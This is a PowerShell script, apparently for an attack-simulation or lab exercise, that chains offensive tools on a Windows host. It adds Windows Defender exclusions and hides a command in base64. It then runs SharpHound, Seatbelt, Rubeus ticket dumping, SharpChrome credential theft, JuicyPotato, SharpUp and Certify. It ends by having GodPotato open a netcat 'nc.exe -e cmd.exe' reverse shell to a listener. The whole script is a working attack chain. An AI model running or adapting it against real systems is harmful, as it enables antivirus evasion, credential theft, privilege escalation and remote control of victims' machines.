# Function to decode base64 strings
function Decode-Base64String {
    param (
        [string]$base64String
    )
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64String))
}

# Function to clone the GitHub repository with precompiled binaries
function Clone-GitRepo {
    param (
        [string]$repoURL,
        [string]$destinationPath
    )
    try {
        if (-not (Test-Path $destinationPath)) {
            git clone $repoURL $destinationPath
            Write-Output "Repository cloned to $destinationPath."
        } else {
            Write-Output "Repository already exists at $destinationPath."
        }
    } catch {
        Write-Error "An error occurred: $_.Exception.Message"
    }
}

# Clone the GitHub repositories containing the binaries
$repoURL = "https://github.com/jakobfriedl/precompiled-binaries.git"
$destinationPath = "C:\Tools\precompiled-binaries"
Clone-GitRepo -repoURL $repoURL -destinationPath $destinationPath

$repo_nc = "https://github.com/int0x33/nc.exe.git"
$ncdestinationPath = "C:\Tools\nc"
Clone-GitRepo -repoURL $repo_nc -destinationPath $ncdestinationPath

# Paths to binaries within the cloned repository
$sharpHoundPath = "$destinationPath\Enumeration\SharpHound.exe"
$seatbeltPath = "$destinationPath\Enumeration\Seatbelt.exe"
$rubeusPath = "$destinationPath\Rubeus.exe"
$sharpChromePath = "$destinationPath\Credentials\SharpChrome.exe"
$juicyPotatoPath = "$destinationPath\Token\JuicyPotato.exe"
$sharpUpPath = "$destinationPath\Enumeration\SharpUp.exe"
$certifyPath = "$destinationPath\CertificateAbuse\Certify.exe"
$godPotatoPath = "$destinationPath\Token\GodPotato.exe"

# Exclude paths and files from Windows Defender
function Exclude-WindowsDefender {
    param (
        [string]$path,
        [string]$process = ""
    )
    try {
        Add-MpPreference -ExclusionPath $path
        if ($process) {
            Add-MpPreference -ExclusionProcess $process
        }
        Write-Output "Excluded $path and $process from Windows Defender."
    } catch {
        Write-Error $_.Exception.Message
    }
}

# Base64 encoded commands for added obfuscation
$cmd1 = "U3RhcnQtU2xlZXAgLVNlY29uZHMgKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gNjAp"  # Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)
iex (Decode-Base64String $cmd1)

# Paths and processes to exclude from Windows Defender
$exclusionPath = "C:\Tools"
$ncProcess = "nc.exe"
$godPotatoProcess = "GodPotato.exe"

Exclude-WindowsDefender -path $exclusionPath -process $ncProcess
Exclude-WindowsDefender -path $exclusionPath -process $godPotatoProcess

# Delayed execution with random intervals
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)

# Execute SharpHound
Invoke-Expression "& `"$sharpHoundPath`" -c All -d"
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
Set-Content -Path "C:\Windows\Temp\flag1.txt" -Value "SharpHound enumeration completed."

# More random delays
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)

# Execute Seatbelt
Invoke-Expression "& `"$seatbeltPath`""
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
Set-Content -Path "C:\Windows\Temp\flag2.txt" -Value "Seatbelt enumeration completed."

# Execute Rubeus
Invoke-Expression "& `"$rubeusPath`" dump"
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
Set-Content -Path "C:\Windows\Temp\flag3.txt" -Value "Rubeus Kerberos ticket dumping completed."

# Execute SharpChrome
Invoke-Expression "& `"$sharpChromePath`""
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
Set-Content -Path "C:\Windows\Temp\flag4.txt" -Value "SharpChrome credentials gathering completed."

# Execute JuicyPotato
$juicyPotatoArgs = "-l 1337 -p C:\Windows\System32\cmd.exe /c 'whoami > C:\Windows\Temp\JuicyPotatoOutput.txt'"
Invoke-Expression "& `"$juicyPotatoPath`" $juicyPotatoArgs"
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
Set-Content -Path "C:\Windows\Temp\flag5.txt" -Value "JuicyPotato privilege escalation completed."

# Additional Execution for SharpUp (Privilege Escalation Checks)
Invoke-Expression "& `"$sharpUpPath`""
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
Set-Content -Path "C:\Windows\Temp\flag6.txt" -Value "SharpUp privilege escalation checks completed."

# Execute Certify (Certificate Abuse)
Invoke-Expression "& `"$certifyPath`""
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)
Set-Content -Path "C:\Windows\Temp\flag7.txt" -Value "Certify certificate abuse completed."

Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)

# Execute GodPotato for privilege escalation and connect back to listener
$ncPath = "C:\Tools\nc\nc.exe" # Ensure the path is correct
$listenerIP = "127.0.0.1" # Replace with the IP of your Netcat listener
$listenerPort = "4444" # Replace with the port of your Netcat listener

# Construct the command for GodPotato to use nc
$godPotatoArgs = "-cmd `"$ncPath` -e cmd.exe $listenerIP $listenerPort`""

Write-Output "Executing GodPotato with command: $godPotatoArgs"

try {
    if (Test-Path $godPotatoPath) {
        # Execute GodPotato to perform privilege escalation and connect to the listener
        Invoke-Expression "& `"$godPotatoPath`" $godPotatoArgs"
        Write-Output "GodPotato executed for privilege escalation and listener connection."
    } else {
        Write-Error "GodPotato.exe not found at $godPotatoPath"
    }
} catch {
    Write-Error "Failed to execute GodPotato: $($_.Exception.Message)"
}

Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)

# Final random delay and termination
Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 60)
